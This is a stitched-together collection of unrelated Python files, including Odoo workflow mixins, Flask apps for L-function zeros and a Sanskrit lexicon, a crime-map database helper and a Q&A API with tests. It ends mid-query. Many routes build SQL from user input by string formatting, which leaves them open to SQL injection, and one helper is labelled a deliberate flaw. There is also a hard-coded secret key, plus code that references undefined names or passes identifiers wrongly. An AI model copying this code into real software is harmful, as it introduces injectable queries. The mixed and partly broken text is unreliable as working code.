    def _get_default_automaton(self):                    
        default_value = 0
        if "current_automaton" in self.env.context:
            try:
                default_value = int(self.env.context.get("current_automaton"))                    
            except Exception:
                default_value = 0
        else:
            return self._do_search_default_automaton()                    

        return self.env["crapo.automaton"].browse(default_value)                    


class WrappedStateMixin(StateObjectMixin):                    
    """
    Mixin class that can be used to define a state object that
    wraps an existing model defining a state for another model

    The wrapped object can be used as a crapo_state

    Should be use as a mixin class in existing objects
    """

    _inherits = {"crapo.state": "crapo_state"}

    crapo_state = fields.Many2one(
        comodel_name="crapo.state",
        string="Related Crapo State",
        store=True,
        index=True,
        required=True,
        ondelete="cascade",
    )                    

    def _do_search_default_automaton(self):                    
        """
        finds or creates the default automaton (one per model)                    
        """
        automaton_model = self.env["crapo.automaton"]
        my_model = self.env["ir.model"].search(
            [("model", "=", self._state_for_model)], limit=1                    
        )                    
        my_automaton = automaton_model.search([("model_id", "=", my_model.id)])                    
        if not my_automaton:
            my_automaton = automaton_model.create(
                {
                    "name": "Automaton for {}".format(self._state_for_model),                    
                    "model_id": my_model.id,
                }
            )                    
        return my_automaton

    def _compute_related_state(
        self, values={}
    ):  # pylint: disable=dangerous-default-value                    
        """
        Create a new crapo_state for an existing record of the WrappedState
        """
        my_automaton = self._do_search_default_automaton()                    

        if not self.crapo_state:
            if not my_automaton:
                return False
            else:
                if "name" not in values:
                    values["name"] = "Default State for %s" % self.id
                values["automaton"] = my_automaton.id
                return self.env["crapo.state"].create(values)                    

# coding: utf-8

# ¬©2018-2019 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).
import logging

from lxml import etree
from lxml.builder import E

from odoo.tools.safe_eval import safe_eval
from odoo.osv import expression


class ReadonlyViewMixin(object):
    """
        Mixin class that can be used to set a whole view readonly with domains
    """

    _readonly_domain = []
    _readonly_fields_to_add = []

    def _fields_view_get(
        self, view_id=None, view_type="form", toolbar=False, submenu=False
    ):
        """
            Override to add crapo_readonly_fields to arch and attrs readonly
            on fields that could be editable
        """
        result = super(ReadonlyViewMixin, self)._fields_view_get(
            view_id, view_type, toolbar, submenu
        )

        readonly_fields = self.fields_get(attributes=["readonly"])
        node = etree.fromstring(result["arch"])
        for field in self._readonly_fields_to_add:
            node.append(E.field(name=field, invisible="1"))

        if not isinstance(self._readonly_domain, (list, tuple)):
            lst_domain = [self._readonly_domain]
        else:
            lst_domain = self._readonly_domain

        self._process_field(node, readonly_fields, lst_domain)
        result["arch"] = etree.tostring(node)
        return result

    def _process_field(self, node, readonly_fields, lst_domain):
        """
            Add readnoly attrs if needed
        """
        if node.get("readonly_global_domain"):
            lst_domain = lst_domain + [node.get("readonly_global_domain")]

        if node.tag == "field":
            field_name = node.get("name")

            attrs = safe_eval(node.get("attrs", "{}"))
            readonly = attrs.get("readonly") or node.get("readonly")
            if isinstance(readonly, str):
                readonly = safe_eval(node.get("readonly", "{}"))

            # Deal with none domain value, if field is explicitly in readonly we skip
            if not isinstance(readonly, (list, tuple)) and readonly:
                return
            # If there is no domain define and fields is already in readonly
            # we skip too
            elif readonly is None and readonly_fields[field_name]["readonly"]:
                return

            _readonly_domain = expression.OR(
                [safe_eval(domain, {"field_name": field_name}) for domain in lst_domain]                    
            )
            if readonly:
                _readonly_domain = expression.OR([readonly, _readonly_domain])

            attrs["readonly"] = _readonly_domain
            node.set("attrs", str(attrs))

        else:
            for child_node in node:
                self._process_field(child_node, readonly_fields, lst_domain)

# coding: utf-8

# ¬©2018-2019 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).

from odoo import models

from odoo.addons.base_crapo_workflow.mixins import (
    crapo_automata_mixins,                    
)  # pylint: disable=odoo-addons-relative-import


class CrapoBusinessObject(crapo_automata_mixins.ObjectWithStateMixin, models.Model):                    
    """
    Base class to define a Business Object.

    Should be use as a mixin class in existing objects
    """

    _name = "crapo.business.object"
    _inherit = ["mail.thread", "mail.activity.mixin"]
    _description = """
    An object on which to  in a workflow, specific to a given model
    """
    _sync_state_field = ""

# coding: utf-8

# ¬©2018 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).

from odoo import fields, models, _, api, exceptions

from odoo.addons.base_crapo_workflow.mixins import (
    crapo_automata_mixins,
)  # pylint: disable=odoo-addons-relative-import


class State(crapo_automata_mixins.StateObjectMixin, models.Model):
    """
    A state used in the context of an automaton
    """

    _name = "crapo.state"
    _description = u"State in a workflow, specific to a given model"
    _order = "sequence, name"

    name = fields.Char(help="State's name", required=True, translate=True, size=32)                    

    description = fields.Char(required=False, translate=True, size=256)

    sequence = fields.Integer(
        default=1, help="Sequence gives the order in which states are displayed"                    
    )

    fold = fields.Boolean(
        string="Folded in kanban",
        help=(
            "This stage is folded in the kanban view "
            "when there are no records in that stage to display."
        ),
        default=False,
    )

    @api.multi
    def write(self, values):
        """
        Override default method to check if there is a valid default_state
        """
        if "default_state" in values:
            if values["default_state"]:
                if len(self) > 1:
                    raise exceptions.ValidationError(
                        _(u"There should only one default state per model")
                    )
                else:
                    found = self.search(
                        [
                            ("default_state", "=", True),
                            ("automaton", "=", self.automaton.id),
                            ("id", "!=", self.id),
                        ]
                    )
                    for s in found:
                        s.write({"default_state": False})

        return super(State, self).write(values)



"""
¬©2019
License: AGPL-3

@author: C. Guychard (Article 714)

"""

import logging

from odoo import models, api
from psycopg2.sql import Identifier
from odoo.addons.base_crapo_workflow.mixins import (
    crapo_automata_mixins,
)  # pylint: disable=odoo-addons-relative-import


class CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):
    _inherit = "crm.stage"
    _state_for_model = "crm.lead"

    def write(self, values):
        if len(self) == 1:
            if "crapo_state" not in values and not self.crapo_state:
                if "name" in values:
                    vals = {"name": values["name"]}
                else:
                    vals = {"name": self.name}
                mystate = self._compute_related_state(vals)
                values["crapo_state"] = mystate.id

        return super(CrmStageWithMixin, self).write(values)

    @api.model
    def create(self, values):
        """ Create a new crapo_stage for each crm_stage
        """
        if "crapo_state" not in values and not self.crapo_state:
            if "name" in values:
                vals = {"name": values["name"]}
            mystate = self._compute_related_state(vals)
            values["crapo_state"] = mystate.id

        return super(CrmStageWithMixin, self).create(values)

    @api.model_cr_context
    def _init_column(self, column_name):
        """ Initialize the value of the given column for existing rows.
            Overridden here because we need to wrap existing stages in
            a new crapo_state for each stage (including a default automaton)
        """
        if column_name not in ["crapo_state"]:
            return super(CrmStageWithMixin, self)._init_column(column_name)
        else:
            default_compute = self._compute_related_state

            tname = Identifier(self._table).as_string(                    
                self.env.cr._obj  # pylint: disable=protected-access
            )
            cname = Identifier(column_name).as_string(                    
                self.env.cr._obj  # pylint: disable=protected-access
            )

            logging.error(
                "MMMMMAIS %s (%s) -> %s", tname, type(tname), str(tname)                    
            )

            self.env.cr.execute(
                "SELECT id, name FROM %s WHERE %s is NULL", (tname, cname)                    
            )
            stages = self.env.cr.fetchall()

            for stage in stages:
                default_value = default_compute(values={"name": stage[1]})
                self.env.cr.execute(
                    "UPDATE %s SET %s=%s WHERE id = %s",
                    (tname, cname, default_value.id, stage[0]),                    
                )
        return True


import flask
from lmfdb.logger import make_logger
import os
from flask import render_template, request, url_for

FirstZeros = flask.Blueprint('first L-function zeros', __name__, template_folder="templates")
logger = make_logger(FirstZeros)

import sqlite3
data_location = os.path.expanduser("~/data/zeros/")
#print data_location


@FirstZeros.route("/")
def firstzeros():
    start = request.args.get('start', None, float)
    end = request.args.get('end', None, float)
    limit = request.args.get('limit', 100, int)
    degree = request.args.get('degree', None, int)
    # signature_r = request.arts.get("signature_r", None, int)
    # signature_c = request.arts.get("signature_c", None, int)
    if limit > 1000:
        limit = 1000
    if limit < 0:
        limit = 100

    # return render_template("first_zeros.html", start=start, end=end,
    # limit=limit, degree=degree, signature_r=signature_r,
    # signature_c=signature_c)
    title = "Search for First Zeros of L-functions"
    bread=[("L-functions", url_for("l_functions.l_function_top_page")), ("First Zeros Search", " "), ]
    return render_template("first_zeros.html",
                           start=start, end=end, limit=limit,
                           degree=degree, title=title, bread=bread)


@FirstZeros.route("/list")
def list_zeros(start=None,
               end=None,
               limit=None,
               fmt=None,
               download=None,
               degree=None):
               # signature_r = None,
               # signature_c = None):
    if start is None:
        start = request.args.get('start', None, float)
    if end is None:
        end = request.args.get('end', None, float)
    if limit is None:
        limit = request.args.get('limit', 100, int)
    if fmt is None:
        fmt = request.args.get('format', 'plain', str)
    if download is None:
        fmt = request.args.get('download', 'no')
    if degree is None:
        degree = request.args.get('degree', None, int)
    # if signature_r is None:
    #    signature_r = request.arts.get("signature_r", None, int)
    # if signature_c is None:
    #    signature_c = request.arts.get("signature_c", None, int)
    if limit > 1000:
        limit = 1000
    if limit < 0:
        limit = 100

    if start is None and end is None:
        end = 1000

    limit = int(limit)

    where_clause = 'WHERE 1=1 '

    if end is not None:
        end = str(end)                    
        # fix up rounding errors, otherwise each time you resubmit the page you will lose one line
        if('.' in end): end = end+'999'                    

    if start is None:
        where_clause += ' AND zero <= ' + end                    
    elif end is None:
        start = float(start)
        where_clause += ' AND zero >= ' + str(start)                    
    else:
        where_clause += ' AND zero >= {} AND zero <= {}'.format(start, end)                    

    if degree is not None and degree != '':
        where_clause += ' AND degree = ' + str(degree)                    

    if end is None:
        query = 'SELECT * FROM (SELECT * FROM zeros {} ORDER BY zero ASC LIMIT {}) ORDER BY zero DESC'.format(
            where_clause, limit)
    else:
        query = 'SELECT * FROM zeros {} ORDER BY zero DESC LIMIT {}'.format(where_clause, limit)

    #print query
    c = sqlite3.connect(data_location + 'first_zeros.db').cursor()
    c.execute(query)                    

    response = flask.Response((" ".join([str(x) for x in row]) + "\n" for row in c))
    response.headers['content-type'] = 'text/plain'
    if download == "yes":
        response.headers['content-disposition'] = 'attachment; filename=zetazeros'
    # response = flask.Response( ("1 %s\n" % (str(row[0]),) for row in c) )
    return response

from flask import Flask, render_template, request, current_app, g
from indic_transliteration import sanscript
from indic_transliteration.sanscript import SchemeMap, SCHEMES, transliterate

import random
import sqlite3 as sql
import re

app = Flask(__name__, static_url_path='', static_folder='static')

@app.route('/')

def index():
    all_vargas = ['‡§∏‡•ç‡§µ‡§∞‡•ç‡§ó‡§µ‡§∞‡•ç‡§ó‡§É','‡§µ‡•ç‡§Ø‡•ã‡§Æ‡§µ‡§∞‡•ç‡§ó‡§É','‡§¶‡§ø‡§ó‡•ç‡§µ‡§∞‡•ç‡§ó‡§É','‡§ï‡§æ‡§≤‡§µ‡§∞‡•ç‡§ó‡§É','‡§ß‡•Ä‡§µ‡§∞‡•ç‡§ó‡§É','‡§∂‡§¨‡•ç‡§¶‡§æ‡§¶‡§ø‡§µ‡§∞‡•ç‡§ó‡§É','‡§®‡§æ‡§ü‡•ç‡§Ø‡§µ‡§∞‡•ç‡§ó‡§É','‡§™‡§æ‡§§‡§æ‡§≤‡§≠‡•ã‡§ó‡§ø‡§µ‡§∞‡•ç‡§ó‡§É','‡§®‡§∞‡§ï‡§µ‡§∞‡•ç‡§ó‡§É','‡§µ‡§æ‡§∞‡§ø‡§µ‡§∞‡•ç‡§ó‡§É','‡§≠‡•Ç‡§Æ‡§ø‡§µ‡§∞‡•ç‡§ó‡§É','‡§™‡•Å‡§∞‡§µ‡§∞‡•ç‡§ó‡§É','‡§∂‡•à‡§≤‡§µ‡§∞‡•ç‡§ó‡§É','‡§µ‡§®‡•å‡§∑‡§ß‡§ø‡§µ‡§∞‡•ç‡§ó‡§É','‡§∏‡§ø‡§Ç‡§π‡§æ‡§¶‡§ø‡§µ‡§∞‡•ç‡§ó‡§É','‡§Æ‡§®‡•Å‡§∑‡•ç‡§Ø‡§µ‡§∞‡•ç‡§ó‡§É','‡§¨‡•ç‡§∞‡§π‡•ç‡§Æ‡§µ‡§∞‡•ç‡§ó‡§É','‡§ï‡•ç‡§∑‡§§‡•ç‡§∞‡§ø‡§Ø‡§µ‡§∞‡•ç‡§ó‡§É','‡§µ‡•à‡§∂‡•ç‡§Ø‡§µ‡§∞‡•ç‡§ó‡§É','‡§∂‡•Ç‡§¶‡•ç‡§∞‡§µ‡§∞‡•ç‡§ó‡§É','‡§µ‡§ø‡§∂‡•á‡§∑‡•ç‡§Ø‡§®‡§ø‡§ò‡•ç‡§®‡§µ‡§∞‡•ç‡§ó‡§É','‡§∏‡§ô‡•ç‡§ï‡•Ä‡§∞‡•ç‡§£‡§µ‡§∞‡•ç‡§ó‡§É','‡§µ‡§ø‡§∂‡•á‡§∑‡•ç‡§Ø‡§®‡§ø‡§ò‡•ç‡§®‡§µ‡§∞‡•ç‡§ó‡§É','‡§∏‡§ô‡•ç‡§ï‡•Ä‡§∞‡•ç‡§£‡§µ‡§∞‡•ç‡§ó‡§É','‡§®‡§æ‡§®‡§æ‡§∞‡•ç‡§•‡§µ‡§∞‡•ç‡§ó‡§É','‡§Ö‡§µ‡•ç‡§Ø‡§Ø‡§µ‡§∞‡•ç‡§ó‡§É']
    return render_template('index.html', all_vargas=all_vargas)

    # try:
    #     with sql.connect('amara.db') as con:
    #         con.row_factory = sql.Row
    #         cur = con.cursor()
    #         cur.execute("select distinct varga from pada")
    #         all_vargas = cur.fetchall();
    #         return render_template('index.html', all_vargas=all_vargas)
    # finally:
    #     con.close()

@app.route('/search')
def search():

    limit = 10
    offset = 0

    user_term = request.args.get('term')
    page = request.args.get('page')
    term = user_term

    if not page:
        page = 1

    offset = limit*(int(page) - 1)

    transliterate_regex = re.compile('.*[a-zA-Z].*')
    if (transliterate_regex.match(term)):
        term = transliterate(term, sanscript.ITRANS, sanscript.DEVANAGARI)

    term = term.replace("*", "%")
    term_words = term.split()

    try:
        with sql.connect('amara.db') as con:
            con.row_factory = sql.Row
            cur = con.cursor()

            if len(term_words) == 1:
                cur.execute("select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada like '%s' or artha like '%s' order by id limit %d offset %d;" % (term, term, limit, offset))                    
                rows = cur.fetchall();
            else:
                query = "select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada in (%s) order by pada limit 100;" % ','.join('?' for i in term_words)
                rows = cur.execute(query, term_words)

            return render_template('search.html', rows=rows, user_term=user_term, term=term, page=page)
    finally:
        con.close()


@app.route('/sloka')
def sloka():

    sloka_number = request.args.get('sloka_number')

    sloka_number_parts = sloka_number.split('.')

    sloka_number_previous = "%s.%s.%d" % (sloka_number_parts[0], sloka_number_parts[1], int(sloka_number_parts[2])-1)
    sloka_number_next = "%s.%s.%d" % (sloka_number_parts[0], sloka_number_parts[1], int(sloka_number_parts[2])+1)

    try:
        with sql.connect('amara.db') as con:
            con.row_factory = sql.Row
            cur = con.cursor()
            cur.execute("select * from mula where sloka_number = '%s' order by sloka_line;" % sloka_number)                    
            mula = cur.fetchall();                    

            cur.execute("select * from pada where sloka_number = '%s' order by id;" % sloka_number)                    
            pada = cur.fetchall();

            varga = ""
            if len(pada) > 0:
                varga = pada[0]["varga"]

            return render_template('sloka.html', mula=mula, pada=pada, varga=varga, sloka_number=sloka_number, sloka_number_previous=sloka_number_previous, sloka_number_next=sloka_number_next)
    finally:
        con.close()

@app.route('/quiz')
def quiz():

    varga = request.args.get('varga')

    try:
        rows =[]

        with sql.connect('amara.db') as con:
            con.row_factory = sql.Row
            cur = con.cursor()
            cur.execute("select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada.varga = '%s' order by random() limit 1;" % varga)                    
            rows = cur.fetchall();

            artha = rows[0]["artha"];
            cur.execute("select pada from pada where varga = '%s' and artha = '%s' order by id" % (varga, artha));                    
            paryaya = cur.fetchall();

            return render_template('quiz.html', rows=rows, paryaya=paryaya, varga=varga)
    finally:
        con.close()

@app.route('/varga')
def varga():

    varga = request.args.get('varga')

    try:
        rows =[]

        with sql.connect('amara.db') as con:
            con.row_factory = sql.Row
            cur = con.cursor()
            cur.execute("select * from mula where varga = '%s';" % varga)                    
            # cur.execute("select * from mula where sloka_number in (select distinct sloka_number from pada where varga='%s');" % varga)
            mula = cur.fetchall();                    



            return render_template('varga.html', mula=mula, varga=varga)
    finally:
        con.close()

if __name__ == "__main__":
    app.run(host="0.0.0.0")

# Copyright 2019 Eficent Business and IT Consulting Services S.L.
# License AGPL-3.0 or later (https://www.gnu.org/licenses/agpl.html).

from odoo import tools
from odoo import api, fields, models


class QCProblemReport(models.Model):
    _name = "qc.problem.report"
    _description = "Problem Tracking Report"
    _auto = False
    _rec_name = 'date'
    _order = 'date desc'

    name = fields.Char('Name', readonly=True)
    date = fields.Datetime('Helpdesk Create Date', readonly=True)
    notes = fields.Text('Notes', readonly=True)
    problem_group_id = fields.Many2one('qc.problem.group', 'Problem Group',
                                       readonly=True)
    color = fields.Integer('Color Index', readonly=True)
    priority = fields.Selection([
        ('0', 'Normal'),
        ('1', 'Low'),
        ('2', 'High'),
        ('3', 'Very High'),
    ], 'Rating', readonly=True)
    stage_id = fields.Many2one('qc.stage', 'Stage', readonly=True)
    qc_team_id = fields.Many2one('qc.team', 'QC Team', readonly=True)
    company_id = fields.Many2one('res.company', 'Company', readonly=True)
    crm_helpdesk_count = fields.Integer('Helpdesk Tickets Count',
                                        readonly=True)

    def _select(self):
        select_str = """
             SELECT qcp.id as id,
                    qcp.name as name,
                    qcp.notes as notes,
                    qcp.problem_group_id as problem_group_id,
                    qcp.color as color,
                    qcp.priority as priority,
                    qcp.stage_id as stage_id,
                    qcp.qc_team_id as qc_team_id,
                    qcp.company_id as company_id,
                    count(hpr) as crm_helpdesk_count,
                    chd.date as date
        """
        return select_str

    def _from(self):
        from_str = """
        qc_problem qcp
            left join helpdesk_problem_rel hpr on hpr.qc_problem_id = qcp.id
            left join crm_helpdesk chd on chd.id = hpr.crm_helpdesk_id
        """
        return from_str

    def _group_by(self):
        group_by_str = """
            GROUP BY
            qcp.id,
            chd.date
        """
        return group_by_str

    @api.model_cr
    def init(self):
        tools.drop_view_if_exists(self.env.cr, self._table)
        self.env.cr.execute("""CREATE or REPLACE VIEW %s as (                    
            %s                    
            FROM ( %s )                    
            %s                    
            )""" % (self._table,                    
                    self._select(),                    
                    self._from(),                    
                    self._group_by()))                    


import pymysql
import dbconfig


class DBHelper:

    def connect(self, database='crimemap'):
        return pymysql.connect(host='localhost',
                                user=dbconfig.db_user,
                                password=dbconfig.db_password,
                                db=database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = "SELECT description FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection = self.connect()
        try:
            # The following introduces a deliberate security flaw
            # See section on SQL injection below
            query = "INSERT INTO crimes (description) VALUES \                    
                    ('{}');".format(data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()
        
    def clear_all(self):
        connection = self.connect()
        try:
            query = "DELETE FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()


import os

import configparser
from flask_bcrypt import Bcrypt
from flask import Flask, render_template, request, flash, session, redirect, url_for
from forms import Last_FM_Form
import mysql.connector

# Read configuration from file.
config = configparser.ConfigParser()
config.read('config.ini')

# Set up application server.
app = Flask(__name__)
bcrypt = Bcrypt(app)
app.secret_key = "adbi327fds"

# Create a function for fetching data from the database.
def sql_query(sql):
    db = mysql.connector.connect(**config['mysql.connector'])
    cursor = db.cursor()
    cursor.execute(sql)
    result = cursor.fetchall()
    cursor.close()
    db.close()
    return result


def sql_execute(sql):
    db = mysql.connector.connect(**config['mysql.connector'])
    cursor = db.cursor()
    cursor.execute(sql)
    db.commit()
    cursor.close()
    db.close()

# For this example you can select a handler function by
# uncommenting one of the @app.route decorators.

#@app.route('/')
def basic_response():
    return "It works!" #example

# This route involves some LOGIN stuff, not implemented yet	
#@app.route('/login', methods = ['GET', 'POST'])
def login():                    
   if request.method == 'POST':                    
      session['username'] = request.form['username']                    
      return redirect(url_for('index'))                    
   #return render_template('login.html', )

# route for account registartion
@app.route("/register", methods=["GET", "POST"])
def register():
    if 'user' in session:
        return redirect(url_for('dashboard'))

    message = None

    if request.method == "POST":
        try: 
            usern = request.form.get("username")
            passw = request.form.get("password")
            passw_hash = bcrypt.generate_password_hash(passw).decode('utf-8')

            result = db.execute("INSERT INTO accounts (username, password) VALUES (:u, :p)", {"u": usern, "p": passw_hash})                    
            db.commit()

            if result.rowcount > 0:
                session['user'] = usern
                return redirect(url_for('dashboard'))

        except exc.IntegrityError:
            message = "Username already exists."
            db.execute("ROLLBACK")
            db.commit()

    return render_template("registration.html", message=message)

#route for logout
@app.route("/logout")
def logout():
    session.pop('user', None)
    return redirect(url_for('login'))
   
# Home page after login
@app.route('/home/', methods=['GET', 'POST'])	
@app.route('/home/<username>', methods=['GET', 'POST'])
def home(username = None):
	lastFM = Last_FM_Form(request.form)
	if request.method == 'POST':                    
		return lastFM_results(lastFM, username = username)
	return render_template('home.html', username = username, form = lastFM)

# Gets search results	
@app.route('/results')
def lastFM_results(lastFM, username):
	results = []
	search_string = lastFM.data['search']
	if lastFM.data['search'] == '':
		#result = 
		#results = result.all()
		result = []
	
	if not results:
		flash('No results could be found for your search, please try again.')
		return redirect('/home/%s' % username)
	else:
		return render_template(lastFM_results.html, results = results)

# Given code from teacher's example, not used yet
#@app.route('/', methods=['GET', 'POST'])
def template_response_with_data():
    print(request.form)
    if "buy-book" in request.form:
        book_id = int(request.form["buy-book"])
        sql = "delete from book where id={book_id}".format(book_id=book_id)
        sql_execute(sql)
    template_data = {}
    sql = "select id, title from book order by title"
    books = sql_query(sql)
    template_data['books'] = books
    return render_template('home-w-data.html', template_data=template_data)

if __name__ == '__main__':
    app.run(**config['app'])

from flask import Blueprint, jsonify, request
from infrastructure import ProductsRepository
from math import ceil

products = Blueprint('products', __name__)

DEFAULT_PAGE = 1
DEFAULT_PER_PAGE = 20
DEFAULT_RATING = 0


@products.route("/", methods=["GET"])
def get_products():
    filters = get_filters()
    if filters['search'] is None:
        products = ProductsRepository.get_products(filters)
        total_products = ProductsRepository.get_total_products(filters)
    else:
        products = ProductsRepository.search_products(
            filters, filters['search'])
        total_products = ProductsRepository.get_total_searched_products(
            filters, filters['search'])
    total_pages = ceil(total_products / filters['perPage'])
    return jsonify(products=products, total_products=total_products, total_pages=total_pages)


@products.route("/department/<department>", methods=["GET"])
def get_departement_products(department):
    filters = get_filters()
    products = ProductsRepository.get_department_products(filters, department)
    total_products = ProductsRepository.get_total_departments_products(
        filters, department)
    total_pages = ceil(total_products / filters['perPage'])
    return jsonify(products=products, total_products=total_products, total_pages=total_pages)


def get_filters():
    page = request.args.get('page') or DEFAULT_PAGE
    perPage = request.args.get('perPage') or DEFAULT_PER_PAGE
    rating = request.args.get('rating') or DEFAULT_RATING
    search = request.args.get('search') or None
    filters = {
        "page": int(page),                    
        "perPage": int(perPage),                    
        "rating": int(rating),                    
        "search": search                    
    }
    return filters


@products.route("/<id>", methods=["GET"])
def get_product(id):
    product = ProductsRepository.get_product(id)
    return jsonify(product=product)


@products.route("/<id>/reviews", methods=["GET"])
def get_product_reviews(id):
    filters = get_filters()
    product_reviews = ProductsRepository.get_product_reviews(id, filters)
    total_product_reviews = ProductsRepository.get_total_product_reviews(id)
    total_pages = ceil(total_product_reviews / filters['perPage'])
    return jsonify(product_reviews=product_reviews, total_product_reviews=total_product_reviews, total_pages=total_pages)


@products.route("/<productId>/reviews/<userId>", methods=["PUT"])
def add_product_review(productId, userId):
    review = get_review()
    try:
        ProductsRepository.add_product_review(productId, userId, review)
        return "Ok"
    except Exception:
        return "Duplicate"


def get_review():
    request_data = request.get_json()
    title = request_data['review']['title']
    comment = request_data['review']['comment']
    rating = request_data['review']['rating']
    review = {
        "title": title,
        "comment": comment,
        "rating": rating
    }
    return review

import pymysql.cursors
from config import create_connection

PRODUCTS_TYPES_TABLE = "product_types"                    


class DepartmentsRepository:

    def get_departments():
        sql_query = (
            f"""                    
            SELECT name                    
            FROM {PRODUCTS_TYPES_TABLE}                    
            """)
        try:
            connection = create_connection()
            cursor = connection.cursor()
            cursor.execute(sql_query)
            return cursor.fetchall()
        finally:
            connection.close()



# Flask create app

# Author: P8ul
# https://github.com/p8ul

from flask import Flask
from .migrations.db import db


def create_app(config_filename):
    app = Flask(__name__)
    app.config.from_object(config_filename)

    with app.app_context():
        pass

    """ Basic Routes """

    # register our blueprints
    configure_blueprints(app)

    # register extensions
    configure_extensions()

    return app


def configure_blueprints(app):
    """Configure blueprints ."""
    from app.questions.api.v1.view import question_blueprint                    
    from .home.views import home_blueprint
    from .auth.api.v1.view import auth_blueprint
    from .answers.api.v1.view import answers_blueprint
    from .votes.api.v1.view import votes_blueprint
    from .comments.api.v1.view import comments_blueprint

    app_blueprints = [
        answers_blueprint,
        question_blueprint,
        auth_blueprint,
        votes_blueprint,
        comments_blueprint,
        home_blueprint
    ]

    for bp in app_blueprints:
        app.register_blueprint(bp)


def configure_extensions():
    db.test()


if __name__ == "__main__":
    app = create_app("config")
    app.run(debug=True)


import unittest                    

from ... import create_app                    
app = create_app("config.TestConfig")


class BaseTestCase(unittest.TestCase):                    
    """A base test case."""                    
    def create_app(self):                    
        app.config.from_object('config.TestConfig')                    
        return app                    

    def setUp(self):                    
        # method to invoke before each test.
        self.client = app.test_client()                    
        self.data = {                    
            'username': 'Paul',                    
            'email': 'pkinuthia10@gmail.com',                    
            'password': 'password'                    
        }                    
        """ Login to get a JWT token """                    
        self.client.post('/api/v1/auth/signup', json=self.data)                    
        response = self.client.post('/api/v1/auth/login', json=self.data)                    
        self.token = response.get_json().get('auth_token')                    
        self.user_id = str(response.get_json()['id'])                    

    def tearDown(self):                    
        # method to invoke after each test.
        pass

# APIs Testing

# Author: P8ul Kinuthia
# https://github.com/p8ul

import unittest
from .base import BaseTestCase                    


class FlaskTestCase(BaseTestCase):

    """ Test List answers api """
    def test_list_answers(self):
        response = self.client.get(
            '/api/v1/questions/answers',
            headers={'Authorization': 'JWT ' + self.token}
        )
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.get_json()['status'], 'success')

    """ Test answers CRUD api """
    def test_post_update(self):
        """ Initialize test data """
        data = {
            'title': 'Test title',
            'body': 'Test body',
            'answer_body': 'Test answer',
            'user': self.user_id
        }

        """ Add test question"""
        self.client.post(
            '/api/v1/questions/', json=data,
            headers={'Authorization': 'JWT ' + self.token}
        )

        response = self.client.get(
            '/api/v1/questions/',
            headers={'Authorization': 'JWT ' + self.token}
        )
        question_id = response.get_json().get('results')[0].get('question_id')

        """ Test post answer """
        response = self.client.post(
            '/api/v1/questions/'+str(question_id)+'/answers', json=data,
            headers={'Authorization': 'JWT ' + self.token}
        )

        """ Test status """
        self.assertEqual(response.status_code, 201)

        """ Test if a question is created """
        self.assertEqual(response.get_json()['status'], 'success')


if __name__ == '__main__':
    unittest.main()


from .base import BaseTestCase
from ..models import Table


class FlaskTestCase(BaseTestCase):

    """ Test signup api """
    def test_model_crud(self):
        # Test Create
        instance = Table.save(self.data)                    
        assert instance == self.data                    

        # Test query
        isinstance(Table.query(), type([]))                    

from flask import Blueprint, request, make_response, jsonify
from flask.views import MethodView
from ...models import Table
from ....utils import jwt_required

comments_blueprint = Blueprint('comments', __name__)


class ListAPIView(MethodView):
    """ Update Instance api resource """

    @jwt_required
    def post(self, answer_id=None):
        post_data = request.get_json(force=True)                    
        response = Table.save(answer_id, data=post_data)                    
        if response:
            response_object = {
                'status': 'success',
                'message': 'Your comment was successful'
            }
            return make_response(jsonify(response_object)), 201

        response_object = {
            'status': 'fail',
            'message': 'Some error occurred. Please try again.'
        }
        return make_response(jsonify(response_object)), 400


# Define the API resources
comment_view = ListAPIView.as_view('comment_api')

# Add Rules for API Endpoints
comments_blueprint.add_url_rule(
    '/api/v1/questions/answers/comment/<string:answer_id>',
    view_func=comment_view,
    methods=['POST']
)

import psycopg2
import psycopg2.extras

from .initial1 import migrations
from config import BaseConfig
from ..utils import db_config


class Database:
    def __init__(self, config):
        self.config = db_config(config)
        self.database = self.config.get('database')

    def test(self):
        con = psycopg2.connect(**self.config)
        con.autocommit = True

        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)
        cur.execute("select * from pg_database where datname = %(database_name)s", {'database_name': self.database})
        databases = cur.fetchall()
        if len(databases) > 0:
            print(" * Database {} exists".format(self.database))
            for command in migrations:
                try:
                    cur.execute(command)
                    con.commit()
                except Exception as e:
                    print(e)
        else:
            print(" * Database {} does not exists".format(self.database))
        con.close()


db = Database(BaseConfig.SQLALCHEMY_DATABASE_URI)                    

from sqlalchemy import sql

from app import db
from pub import Pub

def fulltext_search_title(query):
    query_string = """                    
      SELECT id, ts_headline('english', title, query), ts_rank_cd(to_tsvector('english', title), query, 32) AS rank
        FROM pub_2018, plainto_tsquery('english', '{}') query  -- or try plainto_tsquery, phraseto_tsquery, to_tsquery                    
        WHERE to_tsvector('english', title) @@ query
        ORDER BY rank DESC
        LIMIT 50;""".format(query)

    rows = db.engine.execute(sql.text(query_string)).fetchall()                    
    ids = [row[0] for row in rows]
    my_pubs = db.session.query(Pub).filter(Pub.id.in_(ids)).all()
    for row in rows:
        my_id = row[0]
        for my_pub in my_pubs:
            if my_id == my_pub.id:
                my_pub.snippet = row[1]
                my_pub.score = row[2]
    return my_pubs

def autocomplete_phrases(query):
    query_string = ur"""                    
        with s as (SELECT id, lower(title) as lower_title FROM pub_2018 WHERE title iLIKE '%{query}%')                    
        select match, count(*) as score from (
            SELECT regexp_matches(lower_title, '({query}\w*?\M)', 'g') as match FROM s                    
            union all
            SELECT regexp_matches(lower_title, '({query}\w*?(?:\s+\w+){{1}})\M', 'g') as match FROM s                    
            union all
            SELECT regexp_matches(lower_title, '({query}\w*?(?:\s+\w+){{2}})\M', 'g') as match FROM s                    
            union all
